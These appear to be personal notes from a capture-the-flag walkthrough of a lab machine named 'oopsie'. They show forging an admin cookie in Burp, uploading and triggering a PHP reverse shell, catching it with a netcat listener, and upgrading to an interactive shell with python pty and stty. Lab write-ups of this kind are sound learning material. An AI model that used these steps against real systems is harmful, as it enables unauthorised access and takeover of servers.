http://10.129.161.165/cdn-cgi/login/admin.php?content=uploads

Catch with burp and change the cookie:
Cookie: user=34322; role=admin

![[uploadWebShell.png]]

## Navigate to the shell
10.129.161.165/uploads/php-reverse-shell.php
Modify the cookie entry.
## Connecting to listener on attacker
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.95.191] 57962
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:08:13 up 11 min,  0 users,  load average: 0.00, 0.04, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

## Getting an interactive shell
**Note**: Kali linux now uses the zsh shell by default, and the `stty` and `fg` entries need to be on one line.
```
www-data@oopsie:/$ echo $SHELL
/usr/sbin/nologin
echo $SHELL
www-data@oopsie:/$ which python3
which python3
/usr/bin/python3

www-data@oopsie:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

## Press Control z
www-data@oopsie:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg      
[1]  + continued  nc -lvnp 1337

## Press Enter   
            
www-data@oopsie:/$ 
www-data@oopsie:/$ export TERM=xterm-256color

## Checking autocomplete :)
www-data@oopsie:/$ pwd                       
/
www-data@oopsie:/$ ls -l 
bin/            initrd.img.old  proc/           tmp/
boot/           lib/            root/           usr/
<SNIP>
```